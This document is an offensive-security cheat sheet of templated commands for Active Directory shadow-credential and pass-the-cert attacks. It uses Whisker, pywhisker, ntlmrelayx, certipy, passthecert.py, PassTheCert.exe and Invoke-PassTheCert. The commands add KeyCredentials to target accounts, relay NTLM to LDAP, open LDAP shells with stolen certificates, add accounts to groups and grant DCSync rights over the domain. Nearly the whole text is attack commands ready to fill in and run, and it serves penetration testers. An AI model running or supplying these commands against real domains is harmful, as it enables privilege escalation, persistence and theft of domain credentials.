# Pass The Cert / Whisker

## Whisker

### List shadow credentials

List `msDS-KeyCredentialLink` entries on a target object.

```powershell title:"List shadow credential entries with Whisker"
.\Whisker.exe list /target:"$target_samname" /domain:"$domain" /dc:"$dc_name"
```
<!-- cheat
var target_samname
var domain
var dc_name
-->

### Add shadow credentials

Generate a key pair, add a KeyCredential to the target, and export a PFX.

```powershell title:"Add shadow credentials with Whisker"
.\Whisker.exe add /target:"$target_samname" /domain:"$domain" /dc:"$dc_name" /path:"$pfx_file" /password:"$pfx_pass"
```
<!-- cheat
var target_samname
var domain
var dc_name
var pfx_file
var pfx_pass
-->

### Remove shadow credential

Remove a KeyCredential by DeviceID.

```powershell title:"Remove shadow credential with Whisker"
.\Whisker.exe remove /target:"$target_samname" /domain:"$domain" /dc:"$dc_name" /remove:"$device_id"
```
<!-- cheat
var target_samname
var domain
var dc_name
var device_id
-->

## pywhisker

### List shadow credentials

List KeyCredential entries from Linux.

```sh title:"List shadow credentials with pywhisker"
pywhisker.py -d "$domain" -u "$user" -p "$pass" --target "$target_samname" --action list
```
<!-- cheat
var domain
var user
var pass
var target_samname
-->

### Add shadow credentials

Add a KeyCredential and write the generated PFX material to a named file.

```sh title:"Add shadow credentials with pywhisker"
pywhisker.py -d "$domain" -u "$user" -p "$pass" --target "$target_samname" --action add --filename "$output_name"
```
<!-- cheat
var domain
var user
var pass
var target_samname
var output_name
-->

### Remove shadow credential

Remove a KeyCredential by DeviceID.

```sh title:"Remove shadow credential with pywhisker"
pywhisker.py -d "$domain" -u "$user" -p "$pass" --target "$target_samname" --action remove --device-id "$device_id"
```
<!-- cheat
var domain
var user
var pass
var target_samname
var device_id
-->

### Relay shadow credentials

Use ntlmrelayx to add shadow credentials during LDAP relay.

```sh title:"Relay to LDAP and add shadow credentials"
ntlmrelayx.py -t "ldap://$dc_fqdn" --shadow-credentials --shadow-target "$target_samname"
```
<!-- cheat
var dc_fqdn
var target_samname
-->

## passthecert.py

### Extract cert from PFX

Extract only the certificate for Schannel LDAP auth.

```sh title:"Extract certificate PEM from PFX"
certipy cert -pfx "$pfx_file" -nokey -out "$cert_file"
```
<!-- cheat
var pfx_file
var cert_file
-->

### Extract key from PFX

Extract only the private key for Schannel LDAP auth.

```sh title:"Extract key PEM from PFX"
certipy cert -pfx "$pfx_file" -nocert -out "$key_file"
```
<!-- cheat
var pfx_file
var key_file
-->

### LDAP shell

Open an LDAP shell through Schannel with a certificate and key.

```sh title:"Open Schannel LDAP shell with passthecert"
passthecert.py -action ldap-shell -crt "$cert_file" -key "$key_file" -domain "$domain" -dc-ip "$rhost_ip"
```
<!-- cheat
import domain_ip
var cert_file
var key_file
var domain
-->

### Elevate user

Use Schannel LDAP auth to grant a target user elevated rights.

```sh title:"Elevate user with passthecert.py"
passthecert.py -action modify_user -crt "$cert_file" -key "$key_file" -domain "$domain" -dc-ip "$rhost_ip" -target "$target_samname" -elevate
```
<!-- cheat
import domain_ip
var cert_file
var key_file
var domain
var target_samname
-->

## PassTheCert.exe

### Add account to group

Use the Windows C# PassTheCert tool to add an account to a group over LDAPS.

```powershell title:"Add account to group with PassTheCert.exe"
.\PassTheCert.exe --server "$dc_fqdn" --cert-path "$pfx_file" --add-account-to-group --target "$target_group_dn" --account "$target_user_dn"
```
<!-- cheat
var dc_fqdn
var pfx_file
var target_group_dn
var target_user_dn
-->

## Invoke-PassTheCert

### Import module

Load Invoke-PassTheCert in PowerShell.

```powershell title:"Import Invoke-PassTheCert"
Import-Module .\Invoke-PassTheCert.ps1
```
<!-- cheat -->

### Create LDAP connection

Create a Schannel-backed LDAP connection from a PFX.

```powershell title:"Create Schannel LDAP connection"
$ldap = Invoke-PassTheCert-GetLDAPConnectionInstance -Server "$rhost_ip" -Port 636 -Certificate "$pfx_file"
```
<!-- cheat
import domain_ip
var pfx_file
-->

### Add group member

Add a user to a group over the certificate-backed LDAP connection.

```powershell title:"Add group member with Invoke-PassTheCert"
Invoke-PassTheCert -Action AddGroupMember -LdapConnection $ldap -Identity "$target_user_dn" -GroupDN "$target_group_dn"
```
<!-- cheat
var target_user_dn
var target_group_dn
-->

### Grant DCSync

Grant DCSync rights over the domain object using certificate-backed LDAP.

```powershell title:"Grant DCSync with Invoke-PassTheCert"
Invoke-PassTheCert -Action 'LDAPExploit' -LdapConnection $ldap -Exploit 'DCSync' -Identity "$controlled_user_dn" -Target "$domain_dn"
```
<!-- cheat
var controlled_user_dn
var domain_dn
-->
